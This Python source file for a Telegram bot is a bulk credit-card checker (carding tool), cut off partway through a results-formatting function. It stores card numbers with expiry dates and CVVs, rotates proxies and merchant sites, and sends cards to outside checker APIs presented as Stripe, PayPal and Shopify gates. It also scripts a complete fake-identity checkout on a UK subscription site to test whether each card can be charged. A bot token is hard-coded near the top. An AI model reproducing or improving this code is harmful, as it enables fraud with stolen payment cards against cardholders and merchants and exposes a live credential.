import telebot
from telebot import types
import requests
import sqlite3
import json
import time
import os
import re
import random
from datetime import datetime
from threading import Thread, Lock
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import socket
import html

# ==================== CONFIGURACIÓN ====================
TOKEN = os.environ.get('TOKEN', '8503937259:AAEApOgsbu34qw5J6OKz1dxgvRzrFv9IQdE')
bot = telebot.TeleBot(TOKEN)

# Variable global para el proxy
proxy_actual = None

# Lock para operaciones de base de datos
db_lock = Lock()

# Cola de tareas masivas
active_tasks = {}

# Variables para rotación de sitios y proxies
sitio_index = 0
proxy_index = 0
sitio_lock = Lock()
proxy_lock = Lock()

# Cache para BINs (evita consultas repetidas)
bin_cache = {}
bin_cache_lock = Lock()

# ==================== FUNCIONES DE BASE DE DATOS ====================

def get_db_connection():
    """Crea una nueva conexión a la base de datos"""
    conn = sqlite3.connect('proxies.db', timeout=10)
    conn.row_factory = sqlite3.Row
    return conn

def init_database():
    """Inicializa la base de datos con todas las tablas necesarias"""
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # Tabla de proxies
    cursor.execute('''CREATE TABLE IF NOT EXISTS proxies (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        proxy TEXT UNIQUE,
        fecha TEXT,
        successes INTEGER DEFAULT 0,
        failures INTEGER DEFAULT 0,
        last_used TEXT,
        last_test TEXT,
        status TEXT DEFAULT 'untested'
    )''')
    
    # Tabla de historial
    cursor.execute('''CREATE TABLE IF NOT EXISTS historial (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        cc TEXT,
        proxy TEXT,
        gate TEXT,
        amount TEXT,
        status TEXT,
        message TEXT,
        gates TEXT,
        bin_info TEXT,
        fecha TEXT
    )''')
    
    # Tabla de tarjetas
    cursor.execute('''CREATE TABLE IF NOT EXISTS tarjetas (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        cc TEXT UNIQUE,
        fecha TEXT,
        veces_verificada INTEGER DEFAULT 0
    )''')
    
    # Tabla para sitios
    cursor.execute('''CREATE TABLE IF NOT EXISTS sitios (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        url TEXT UNIQUE,
        fecha TEXT,
        successes INTEGER DEFAULT 0,
        failures INTEGER DEFAULT 0,
        last_used TEXT
    )''')
    
    # Agregar columnas si no existen
    try:
        cursor.execute("ALTER TABLE proxies ADD COLUMN last_test TEXT")
        cursor.execute("ALTER TABLE proxies ADD COLUMN status TEXT DEFAULT 'untested'")
    except:
        pass
    
    try:
        cursor.execute("ALTER TABLE historial ADD COLUMN gate TEXT")
        cursor.execute("ALTER TABLE historial ADD COLUMN amount TEXT")
    except:
        pass
    
    try:
        cursor.execute("ALTER TABLE historial ADD COLUMN bin_info TEXT")
    except:
        pass
    
    conn.commit()
    conn.close()
    print("✅ Base de datos configurada correctamente")

# Inicializar BD
init_database()

# ==================== FUNCIONES DE EXTRACCIÓN ====================

def extraer_urls_de_texto(texto):
    """Extrae SOLO URLs de cualquier texto"""
    patron = r'https?://[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}(?:/[^\s<>"\']*)?'
    urls = re.findall(patron, texto, re.IGNORECASE)
    
    urls_limpias = []
    for url in urls:
        url = url.strip()
        url = re.sub(r'[.,;:)\]}>"\']+$', '', url)
        url = re.sub(r'\?.*$', '', url)
        url = re.sub(r'#.*$', '', url)
        
        if url.startswith('http'):
            urls_limpias.append(url)
    
    # Eliminar duplicados
    urls_vistas = []
    resultado = []
    for url in urls_limpias:
        if url not in urls_vistas:
            urls_vistas.append(url)
            resultado.append(url)
    
    return resultado

def extraer_proxies_de_texto(texto):
    """Extrae proxies de cualquier texto"""
    patron_proxy = re.compile(r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d{1,5})(?::([^:\s]+):([^:\s]+))?\b')
    
    proxies = []
    for match in patron_proxy.finditer(texto):
        ip = match.group(1)
        puerto = match.group(2)
        user = match.group(3)
        pwd = match.group(4)
        
        partes_ip = ip.split('.')
        ip_valida = all(0 <= int(p) <= 255 for p in partes_ip)
        
        if ip_valida:
            if user and pwd:
                proxy = f"{ip}:{puerto}:{user}:{pwd}"
            else:
                proxy = f"{ip}:{puerto}"
            
            if 1 <= int(puerto) <= 65535:
                proxies.append(proxy)
    
    return list(set(proxies))

def extraer_tarjetas_de_texto(texto):
    """Extrae TODAS las tarjetas SIN LÍMITE"""
    lineas = texto.strip().split('\n')
    tarjetas = []
    
    for linea in lineas:
        linea = linea.strip()
        if '|' in linea:
            partes = linea.split('|')
            if len(partes) == 4:
                if all(p.isdigit() for p in partes):
                    tarjetas.append(linea)
    
    return tarjetas

# ==================== FUNCIONES DE PROXIES ====================

def guardar_proxy(proxy):
    conn = None
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("INSERT INTO proxies (proxy, fecha) VALUES (?, ?)", 
                      (proxy, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        conn.commit()
        return True
    except Exception as e:
        print(f"Error guardando proxy: {e}")
        return False
    finally:
        if conn:
            conn.close()

def obtener_proxies():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT proxy FROM proxies")
    proxies = [row[0] for row in cursor.fetchall()]
    conn.close()
    return proxies

def obtener_proximo_proxy():
    global proxy_index
    with proxy_lock:
        proxies = obtener_proxies()
        if not proxies:
            return None
        proxy = proxies[proxy_index % len(proxies)]
        proxy_index += 1
        return proxy

def obtener_proxies_con_estadisticas():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT proxy, successes, failures, last_test, status FROM proxies ORDER BY successes DESC, failures ASC")
    resultados = cursor.fetchall()
    conn.close()
    return resultados

def eliminar_proxy(proxy):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM proxies WHERE proxy = ?", (proxy,))
    conn.commit()
    filas = cursor.rowcount
    conn.close()
    return filas > 0

def eliminar_todos_proxies():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM proxies")
    conn.commit()
    filas = cursor.rowcount
    conn.close()
    return filas

def eliminar_proxies_muertos():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM proxies WHERE status = 'dead'")
    conn.commit()
    filas = cursor.rowcount
    conn.close()
    return filas

def actualizar_estadisticas_proxy(proxy, success):
    conn = get_db_connection()
    cursor = conn.cursor()
    campo = "successes" if success else "failures"
    cursor.execute(f"UPDATE proxies SET {campo} = {campo} + 1, last_used = ? WHERE proxy = ?", 
                  (datetime.now().strftime("%Y-%m-%d %H:%M:%S"), proxy))
    conn.commit()
    conn.close()

def actualizar_status_proxy(proxy, status, tiempo):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("UPDATE proxies SET status = ?, last_test = ? WHERE proxy = ?",
                  (status, datetime.now().strftime("%Y-%m-%d %H:%M:%S"), proxy))
    conn.commit()
    conn.close()

# ==================== FUNCIONES PARA SITIOS ====================

def guardar_sitio(url):
    conn = None
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("INSERT INTO sitios (url, fecha) VALUES (?, ?)", 
                      (url, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        conn.commit()
        return True
    except Exception as e:
        print(f"Error guardando sitio: {e}")
        return False
    finally:
        if conn:
            conn.close()

def obtener_sitios():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT url FROM sitios")
    sitios = [row[0] for row in cursor.fetchall()]
    conn.close()
    return sitios

def obtener_proximo_sitio():
    global sitio_index
    with sitio_lock:
        sitios = obtener_sitios()
        if not sitios:
            return None
        sitio = sitios[sitio_index % len(sitios)]
        sitio_index += 1
        return sitio

def obtener_sitios_con_estadisticas():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT url, successes, failures, last_used FROM sitios ORDER BY successes DESC, failures ASC")
    resultados = cursor.fetchall()
    conn.close()
    return resultados

def eliminar_sitio(url):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM sitios WHERE url = ?", (url,))
    conn.commit()
    filas = cursor.rowcount
    conn.close()
    return filas > 0

def eliminar_todos_sitios():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM sitios")
    conn.commit()
    filas = cursor.rowcount
    conn.close()
    return filas

def actualizar_estadisticas_sitio(url, success):
    conn = get_db_connection()
    cursor = conn.cursor()
    campo = "successes" if success else "failures"
    cursor.execute(f"UPDATE sitios SET {campo} = {campo} + 1, last_used = ? WHERE url = ?", 
                  (datetime.now().strftime("%Y-%m-%d %H:%M:%S"), url))
    conn.commit()
    conn.close()

# ==================== LIMPIEZA AUTOMÁTICA DE SITIOS ====================

def limpiar_sitios_muertos():
    conn = get_db_connection()
    cursor = conn.cursor()
    
    cursor.execute("SELECT id, url, failures FROM sitios")
    sitios = cursor.fetchall()
    
    respuestas_validas = [
        '3d secure', '3ds', 'charge', 'approved', 'declined',
        'captcha_required', 'captcha required'
    ]
    
    respuestas_muertas = [
        'py id empty', 'r4 token empty', 'token empty', 'invalid token',
        'empty response', 'no response', 'null response', 'api error',
        '404', '500', '502', '503', 'not found', 'connection refused',
        'timeout', 'ssl error', 'page not found', 'access denied',
        'forbidden', 'server error'
    ]
    
    eliminados = 0
    for sitio in sitios:
        sitio_id = sitio['id']
        url = sitio['url']
        failures = sitio['failures']
        
        try:
            cc_prueba = "4242424242424242|12|25|123"
            resultado = verificar_api_autoshopify(cc_prueba, url)
            mensaje = resultado.get('message', '').lower()
            
            es_valida = any(rv in mensaje for rv in respuestas_validas)
            es_muerto = any(rm in mensaje for rm in respuestas_muertas)
            
            if es_muerto or (not es_valida and failures >= 3):
                cursor.execute("DELETE FROM sitios WHERE id = ?", (sitio_id,))
                eliminados += 1
                print(f"🗑️ Sitio eliminado: {url}")
            
        except Exception as e:
            if failures >= 3:
                cursor.execute("DELETE FROM sitios WHERE id = ?", (sitio_id,))
                eliminados += 1
                print(f"🗑️ Sitio eliminado por excepción: {url}")
    
    conn.commit()
    conn.close()
    return eliminados

def limpiar_sitios_programado():
    while True:
        time.sleep(3600)
        try:
            eliminados = limpiar_sitios_muertos()
            if eliminados > 0:
                print(f"🧹 Limpieza automática: {eliminados} sitios eliminados")
        except Exception as e:
            print(f"❌ Error en limpieza programada: {e}")

limpieza_thread = Thread(target=limpiar_sitios_programado, daemon=True)
limpieza_thread.start()

# ==================== FUNCIONES DE TARJETAS ====================

def guardar_tarjetas_desde_lista(tarjetas):
    guardadas = 0
    repetidas = 0
    
    conn = get_db_connection()
    cursor = conn.cursor()
    
    for cc in tarjetas:
        try:
            cursor.execute("INSERT INTO tarjetas (cc, fecha) VALUES (?, ?)",
                          (cc, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
            conn.commit()
            guardadas += 1
        except:
            repetidas += 1
    
    conn.close()
    return guardadas, repetidas

def obtener_todas_tarjetas():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT cc, fecha, veces_verificada FROM tarjetas ORDER BY fecha DESC")
    resultados = cursor.fetchall()
    conn.close()
    return resultados

def aumentar_contador_tarjeta(cc):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("UPDATE tarjetas SET veces_verificada = veces_verificada + 1 WHERE cc = ?",
                  (cc,))
    conn.commit()
    conn.close()

def eliminar_tarjeta(cc):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM tarjetas WHERE cc = ?", (cc,))
    conn.commit()
    filas = cursor.rowcount
    conn.close()
    return filas > 0

def eliminar_todas_tarjetas():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM tarjetas")
    conn.commit()
    filas = cursor.rowcount
    conn.close()
    return filas

def guardar_historial(cc, proxy, gate, amount, status, message, gates, bin_info):
    if isinstance(bin_info, dict):
        bin_info_str = json.dumps(bin_info)
    else:
        bin_info_str = bin_info
    
    conn = get_db_connection()
    cursor = conn.cursor()
    
    cursor.execute("INSERT INTO historial (cc, proxy, gate, amount, status, message, gates, bin_info, fecha) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
                  (cc, proxy, gate, amount, status, message, gates, bin_info_str, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
    conn.commit()
    conn.close()
    
    if proxy != 'gestionado':
        actualizar_estadisticas_proxy(proxy, status == 'success')
    
    aumentar_contador_tarjeta(cc)

def obtener_estadisticas():
    conn = get_db_connection()
    cursor = conn.cursor()
    
    cursor.execute("SELECT COUNT(*), SUM(successes), SUM(failures) FROM proxies")
    stats_proxies = cursor.fetchone()
    
    cursor.execute("SELECT COUNT(*), SUM(successes), SUM(failures) FROM sitios")
    stats_sitios = cursor.fetchone()
    
    cursor.execute("SELECT COUNT(*) FROM tarjetas")
    total_tarjetas = cursor.fetchone()[0]
    
    cursor.execute("SELECT COUNT(*) FROM historial")
    total_checks = cursor.fetchone()[0]
    
    cursor.execute("SELECT COUNT(*) FROM historial WHERE status='success'")
    total_success = cursor.fetchone()[0]
    
    conn.close()
    
    return {
        'proxies': stats_proxies[0] or 0,
        'exits_proxy': stats_proxies[1] or 0,
        'fallos_proxy': stats_proxies[2] or 0,
        'sitios': stats_sitios[0] or 0,
        'exits_sitio': stats_sitios[1] or 0,
        'fallos_sitio': stats_sitios[2] or 0,
        'tarjetas': total_tarjetas or 0,
        'checks': total_checks or 0,
        'aprobadas': total_success or 0
    }

# ==================== FUNCIÓN DE CONSULTA BIN CON CACHE ====================

def get_emoji_flag(country_code):
    if not country_code or len(country_code) != 2:
        return '🌍'
    flag = ''.join(chr(127397 + ord(c)) for c in country_code.upper())
    return flag

def consultar_bin_con_cache(bin_number):
    """Consulta BIN con cache para evitar llamadas repetidas"""
    global bin_cache
    
    with bin_cache_lock:
        if bin_number in bin_cache:
            return bin_cache[bin_number]
    
    bin_number = bin_number[:6]
    
    try:
        url = f"https://lookup.binlist.net/{bin_number}"
        headers = {'Accept-Version': '3'}
        response = requests.get(url, headers=headers, timeout=5)
        
        if response.status_code == 200:
            data = response.json()
            if data:
                resultado = {
                    'scheme': data.get('scheme', 'UNKNOWN').upper(),
                    'type': data.get('type', 'UNKNOWN').upper(),
                    'brand': data.get('brand', data.get('scheme', 'UNKNOWN')).upper(),
                    'country': data.get('country', {}).get('name', 'Unknown'),
                    'country_code': data.get('country', {}).get('alpha2', 'XX'),
                    'country_emoji': get_emoji_flag(data.get('country', {}).get('alpha2', 'XX')),
                    'bank': data.get('bank', {}).get('name', 'Unknown'),
                    'prepaid': data.get('prepaid', False)
                }
            else:
                resultado = {
                    'scheme': 'UNKNOWN', 'type': 'UNKNOWN', 'brand': 'UNKNOWN',
                    'country': 'Unknown', 'country_code': 'XX', 'country_emoji': '🌍',
                    'bank': 'Unknown', 'prepaid': False
                }
        else:
            resultado = {
                'scheme': 'UNKNOWN', 'type': 'UNKNOWN', 'brand': 'UNKNOWN',
                'country': 'Unknown', 'country_code': 'XX', 'country_emoji': '🌍',
                'bank': 'Unknown', 'prepaid': False
            }
    except Exception:
        resultado = {
            'scheme': 'UNKNOWN', 'type': 'UNKNOWN', 'brand': 'UNKNOWN',
            'country': 'Unknown', 'country_code': 'XX', 'country_emoji': '🌍',
            'bank': 'Unknown', 'prepaid': False
        }
    
    with bin_cache_lock:
        bin_cache[bin_number] = resultado
    
    return resultado

# ==================== FUNCIÓN DE VERIFICACIÓN STRIPE $1 NO AVS ====================

def verificar_api_stripe_noavs(cc, proxy=None):
    try:
        api_url = f"https://samurai-api-hub.up.railway.app/api/check5?c={cc}"
        if proxy:
            api_url += f"&p={proxy}"
        
        start_time = time.time()
        response = requests.get(api_url, timeout=30)
        elapsed = time.time() - start_time
        
        try:
            data = response.json()
            status = data.get('status', 'unknown')
            message = data.get('message', 'Sin mensaje')
            gates = data.get('gates', 'stripe 1.00$ charged (No AVS)')
            amount = data.get('amount', '1.00')
            
            return {
                'success': status == 'success',
                'status': status,
                'message': message,
                'gates': gates,
                'gate_name': 'Stripe $1 No AVS',
                'amount': amount,
                'proxy': proxy if proxy else 'gestionado',
                'tiempo': elapsed
            }
            
        except json.JSONDecodeError:
            return {
                'success': False,
                'status': 'error',
                'message': f'HTTP {response.status_code}',
                'gates': 'stripe error',
                'gate_name': 'Stripe $1 No AVS',
                'amount': '1.00',
                'proxy': proxy if proxy else 'gestionado',
                'tiempo': elapsed
            }
            
    except Exception as e:
        return {
            'success': False,
            'status': 'error',
            'message': str(e),
            'gates': 'stripe error',
            'gate_name': 'Stripe $1 No AVS',
            'amount': '1.00',
            'proxy': proxy if proxy else 'gestionado',
            'tiempo': 30
        }

# ==================== FUNCIONES DE VERIFICACIÓN PAYPAL ====================

def verificar_api_paypal(cc, gate=1, proxy=None):
    gates = {
        1: {"endpoint": "/pp/check", "amount": "10.00", "name": "PayPal $10"},
        2: {"endpoint": "/pp/check2", "amount": "0.10", "name": "PayPal $0.10"},
        3: {"endpoint": "/pp/check3", "amount": "1.00", "name": "PayPal $1"}
    }
    
    gate_info = gates.get(gate, gates[1])
    
    try:
        api_url = f"https://samurai-api-hub.up.railway.app{gate_info['endpoint']}?c={cc}"
        if proxy:
            api_url += f"&p={proxy}"
        
        start_time = time.time()
        response = requests.get(api_url, timeout=30)
        elapsed = time.time() - start_time
        
        try:
            data = response.json()
            status = data.get('status', 'unknown')
            message = data.get('message', 'Sin mensaje')
            gates_str = f"paypal {gate_info['amount']}$ charged"
            
            return {
                'success': status == 'success',
                'status': status,
                'message': message,
                'gates': gates_str,
                'gate_name': gate_info['name'],
                'amount': gate_info['amount'],
                'proxy': proxy if proxy else 'gestionado',
                'tiempo': elapsed
            }
            
        except json.JSONDecodeError:
            return {
                'success': False,
                'status': 'error',
                'message': f'HTTP {response.status_code}',
                'gates': 'paypal error',
                'gate_name': gate_info['name'],
                'amount': gate_info['amount'],
                'proxy': proxy if proxy else 'gestionado',
                'tiempo': elapsed
            }
            
    except Exception as e:
        return {
            'success': False,
            'status': 'error',
            'message': str(e),
            'gates': 'paypal error',
            'gate_name': gate_info['name'],
            'amount': gate_info['amount'],
            'proxy': proxy if proxy else 'gestionado',
            'tiempo': 30
        }

# ==================== FUNCIÓN DE VERIFICACIÓN AUTOSHOPIFY ====================

def verificar_api_autoshopify(cc, url, proxy=None):
    try:
        api_url = f"https://auto-shopify-api-production.up.railway.app/index.php?site={url}&cc={cc}"
        
        if proxy:
            api_url += f"&proxy={proxy}"
        
        start_time = time.time()
        response = requests.get(api_url, timeout=30)
        elapsed = time.time() - start_time
        
        try:
            data = response.json()
            response_text = data.get('Response', 'Unknown')
            price = data.get('Price', '0.00')
            
            is_success = 'Order completed' in response_text or 'success' in response_text.lower()
            
            return {
                'success': is_success,
                'status': 'success' if is_success else 'failed',
                'message': response_text,
                'gates': f"Shopify ${price}",
                'gate_name': f"AutoShopify ${price}",
                'amount': price,
                'url': url,
                'proxy': proxy if proxy else 'gestionado',
                'tiempo': elapsed
            }
            
        except json.JSONDecodeError:
            return {
                'success': False,
                'status': 'error',
                'message': f'HTTP {response.status_code} - {response.text[:100]}',
                'gates': 'shopify error',
                'gate_name': 'AutoShopify',
                'amount': '0.00',
                'url': url,
                'proxy': proxy if proxy else 'gestionado',
                'tiempo': elapsed
            }
            
    except Exception as e:
        return {
            'success': False,
            'status': 'error',
            'message': str(e),
            'gates': 'shopify error',
            'gate_name': 'AutoShopify',
            'amount': '0.00',
            'url': url,
            'proxy': proxy if proxy else 'gestionado',
            'tiempo': 30
        }

# ==================== FUNCIÓN DE VERIFICACIÓN iSubscribe UK ====================

def capture(text, start_str, end_str):
    try:
        start = text.find(start_str)
        if start == -1:
            return ""
        start += len(start_str)
        end = text.find(end_str, start)
        if end == -1:
            return ""
        return text[start:end].strip()
    except:
        return ""

def verificar_isubscribe(cc, proxy=None):
    start_time = time.time()
    session = requests.Session()
    
    if proxy:
        proxy_parts = proxy.split(':')
        if len(proxy_parts) == 4:
            ip, puerto, user, pwd = proxy_parts
            proxy_url = f'http://{user}:{pwd}@{ip}:{puerto}'
            session.proxies = {'http': proxy_url, 'https': proxy_url}
            proxy_used = proxy
        else:
            session.proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
            proxy_used = proxy
    else:
        proxy_used = "gestionado"
    
    try:
        partes = cc.split('|')
        if len(partes) != 4:
            return {
                'success': False,
                'status': 'error',
                'message': 'Formato inválido',
                'gate_name': 'iSubscribe UK £4',
                'amount': '4.00',
                'proxy': proxy_used,
                'tiempo': round(time.time() - start_time, 2)
            }

        numero, mes, año, cvv = partes
        
        if len(mes) == 1:
            mes = f'0{mes}'
        if len(año) == 2:
            año_short = año
        else:
            año_short = año[-2:]

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }

        if numero.startswith('3'):
            card_type = "AMEX"
        elif numero.startswith('4'):
            card_type = "VISA"
        elif numero.startswith('5'):
            card_type = "Mastercard"
        else:
            card_type = "VISA"

        r = session.get("https://www.isubscribe.co.uk/She-Kicks-Magazine-Subscription.cfm", 
                       headers=headers, timeout=15)
        
        if r.status_code != 200:
            return {
                'success': False,
                'status': 'error',
                'message': f'Error HTTP {r.status_code}',
                'gate_name': 'iSubscribe UK £4',
                'amount': '4.00',
                'proxy': proxy_used,
                'tiempo': round(time.time() - start_time, 2)
            }
        
        pi = capture(r.text, "prodId=", "&amp")
        ps = capture(r.text, "prodSubId=", "&amp")
        
        session.get(f"https://www.isubscribe.co.uk/cart.cfm?action=add&prodId={pi}&prodSubId={ps}&qty=1", 
                   headers=headers, timeout=10)
        
        email = f"test{random.randint(1000,9999)}@gmail.com"
        
        data_billing = (
            f"itemcount=1&guestcheckout=true&userid=&email={email}"
            f"&title=Mr.&firstname=John&lastname=Doe&phone=1234567890"
            f"&company=&street=1+Warwick+Road&suburb=Thames+Ditton"
            f"&postcode=KT7+0PR&state=&otherstate=&country=United+Kingdom"
            f"&prodsubid_1={ps}&prodtitle_1=She+Kicks+Magazine"
            f"&emaildelivery_1=0&isdigital_1=0&isgiftvoucher_1=0"
            f"&xmas_start_1=0&renewal_1=0&gift_1=0&senderfirstname_1=+"
            f"&email_1=&message_1=&senddate_1=18%2F10%2F2023&address_1=billing"
            f"&title_1=Mr.&firstname_1=John&lastname_1=Doe&company_1="
            f"&street_1=1+Warwick+Road&suburb_1=Thames+Ditton"
            f"&postcode_1=KT7+0PR&state_1=United+Kingfonm"
            f"&country_1=United+Kingdom&publisher_post=0&organisations_post=0"
            f"&isubscribe_terms=1"
        )
        
        headers_billing = headers.copy()
        headers_billing['Content-Type'] = 'application/x-www-form-urlencoded'
        
        session.post(
            "https://www.isubscribe.co.uk/ssl/checkout/index.cfm?view=new&mode=admin&action=setbilling&formmode=new&ajax=true",
            headers=headers_billing,
            data=data_billing,
            timeout=15
        )
        
        session.post(
            "https://www.isubscribe.co.uk/ssl/checkout/index.cfm?view=new&mode=admin&action=setpayment&formmode=new&ajax=true",
            headers=headers_billing,
            data=f"paymentMethod=creditcard&walletToken=&card={card_type}",
            timeout=15
        )
        
        r = session.get("https://www.isubscribe.co.uk/ssl/checkout/index.cfm?view=new&step=confirm", 
                       headers=headers, timeout=15)
        
        ft = capture(r.text, "fzToken = '", "'")
        ve = capture(r.text, '"verification" value="', '"')
        am = capture(r.text, "amount: ", ",")
        
        r = session.get("https://paynow.pmnts.io/sdk/bridge", headers=headers, timeout=15)
        cs = capture(r.text, "'X-CSRF-Token': \"", "\"")
        
        headers_card = {
            "x-csrf-token": cs,
            "authorization": f"Bearer {ft}",
            "content-type": "application/json",
        }
        
        data_card = {
            "card_holder": "John Doe",
            "card_number": numero,
            "card_expiry": f"{mes}/{año_short}",
            "cvv": cvv,
        }
        
        r = session.post("https://paynow.pmnts.io/sdk/credit_cards", 
                        headers=headers_card, json=data_card, timeout=15)
        
        headers_sca = {
            "fz-merchant-username": "isubscribeunitedkingdom",
            "authorization": f"Bearer {ft}",
            "content-type": "application/json",
        }
        
        monto_int = int(am) if am and am.isdigit() else 400
        r = session.post("https://api.pmnts.io/sca/session", 
                        headers=headers_sca, 
                        json={"amount": monto_int, "currency": "GBP"},
                        timeout=15)
        
        data_payment = (
            f"return_path=https%3A%2F%2Fwww.isubscribe.co.uk%2Fssl%2Fcheckout%2Findex.cfm%3Fview%3Dnew%26step%3Dconfirm%26mode%3Dadmin%26action%3DplaceOrder%26source%3Dconfirm"
            f"&verification={ve}&card_type={card_type}&card_number={numero}"
            f"&card_holder=John+Doe&expiry_month={mes}&expiry_year={año_short}"
            f"&cvv={cvv}"
        )
        
        r = session.post(
            "https://gateway.pmnts.io/v2/credit_cards/direct/isubscribeunitedkingdom",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data=data_payment,
            timeout=15,
            allow_redirects=False
        )
        
        r = session.get(
            "https://www.isubscribe.co.uk/ssl/checkout/index.cfm?view=returning&step=confirm&formmode=edit&source=confirm&error=true&errorno=05",
            headers=headers,
            timeout=15
        )
        
        error_msg = "The transaction was declined, please check with the card issuer or use a different card."
        
        decline_match = re.search(r'The transaction was declined[^<]*', r.text, re.IGNORECASE)
        if decline_match:
            error_msg = decline_match.group(0)
        else:
            card_declined = re.search(r'Your card was declined[^<]*', r.text, re.IGNORECASE)
            if card_declined:
                error_msg = card_declined.group(0)
            else:
                generic_decline = re.search(r'Card declined[^<]*', r.text, re.IGNORECASE)
                if generic_decline:
                    error_msg = generic_decline.group(0)
        
        elapsed_time = time.time() - start_time
        
        if r.status_code == 302:
            status = "success"
            msg = "✅ CARGO EXITOSO de £4.00 GBP"
            success = True
        elif "insufficient funds" in error_msg.lower():
            status = "success"
            msg = "⚠️ Fondos insuficientes (tarjeta válida)"
            success = True
        else:
            status = "failed"
            msg = error_msg
            success = False
        
        return {
            'success': success,
            'status': status,
            'message': msg,
            'gate_name': 'iSubscribe UK £4',
            'amount': '4.00',
            'proxy': proxy_used,
            'tiempo': round(elapsed_time, 2)
        }
        
    except requests.exceptions.Timeout:
        return {
            'success': False,
            'status': 'error',
            'message': 'Timeout de conexión',
            'gate_name': 'iSubscribe UK £4',
            'amount': '4.00',
            'proxy': proxy_used,
            'tiempo': round(time.time() - start_time, 2)
        }
    except requests.exceptions.ConnectionError:
        return {
            'success': False,
            'status': 'error',
            'message': 'Error de conexión',
            'gate_name': 'iSubscribe UK £4',
            'amount': '4.00',
            'proxy': proxy_used,
            'tiempo': round(time.time() - start_time, 2)
        }
    except Exception as e:
        return {
            'success': False,
            'status': 'error',
            'message': str(e)[:100],
            'gate_name': 'iSubscribe UK £4',
            'amount': '4.00',
            'proxy': proxy_used,
            'tiempo': round(time.time() - start_time, 2)
        }

# ==================== FORMATO PREMIUM PARA RESULTADOS ====================

def formato_check_premium(cc, resultado_api, bin_info, tiempo, user_name="User", gate_type="Stripe"):
    if resultado_api['status'] == 'success':
        estado_verif = "𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 ✅"
        color_estado = "✅"
    elif resultado_api['status'] == 'failed':
        estado_verif = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
        color_estado = "❌"
    elif resultado_api['status'] == 'error':
        estado_verif = "𝐄𝐫𝐫𝐨𝐫 ⚠️"
        color_estado = "⚠️"
    else:
        estado_verif = "𝐔𝐧𝐤𝐧𝐨𝐰𝐧 ❓"
        color_estado = "❓"
    
    partes = cc.split('|')
    numero = partes[0]
    mes = partes[1]
    año = partes[2]
    cvv = partes[3]
    bin_num = numero[:6]
    
    if bin_info and isinstance(bin_info, dict) and 'error' not in bin_info:
        scheme = bin_info.get('scheme', 'UNKNOWN').upper()
        card_type = bin_info.get('type', 'UNKNOWN').upper()
        
        country_name = bin_info.get('country', 'Unknown')
        country_emoji = bin_info.get('country_emoji', '🌍')
        bank_name = bin_info.get('bank', 'Unknown')
        
        if scheme == "VISA":
            tipo_completo = "VISA"
        elif scheme == "MASTERCARD":
            tipo_completo = "MASTERCARD"
        elif scheme == "AMEX":
            tipo_completo = "AMERICAN EXPRESS"
        elif scheme == "DISCOVER":
            tipo_completo = "DISCOVER"
        elif scheme == "JCB":
            tipo_completo = "JCB"
        else:
            tipo_completo = scheme
        
        if card_type == "CREDIT":
            tipo_especifico = "CREDIT"
        elif card_type == "DEBIT":
            tipo_especifico = "DEBIT"
        elif bin_info.get('prepaid', False):
            tipo_especifico = "PREPAID"
        else:
            tipo_especifico = card_type.capitalize() if card_type != "UNKNOWN" else "UNKNOWN"
        
        country_line = f"{country_name} {country_emoji}"
    else:
        tipo_completo = "UNKNOWN"
        tipo_especifico = "UNKNOWN"
        country_line = "Unknown 🌍"
        bank_name = "Unknown"
    
    if resultado_api['proxy'] == 'gestionado':
        proxy_status = "API 🌐"
    else:
        proxy_status = "Live ✨"
    
    if tiempo < 60:
        tiempo_str = f"{tiempo:.2f}s"
    else:
        minutos = int(tiempo // 60)
        segundos = int(tiempo % 60)
        tiempo_str = f"{minutos}m {segundos}s"
    
    status_msg = resultado_api['message']
    
    texto = f"""
{color_estado} {estado_verif}
━━━━━━━━━━━━━━━━━━━━━━
[ϟ] 𝗖𝗖 : {numero}|{mes}|{año}|{cvv}
[ϟ] 𝗚𝗮𝘁𝗲 : {resultado_api['gate_name']}
[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀 : {status_msg[:40]}
━━━━━━━━━━━━━━━━━━━━━━
[ϟ] 𝗕𝗶𝗻 : {bin_num}
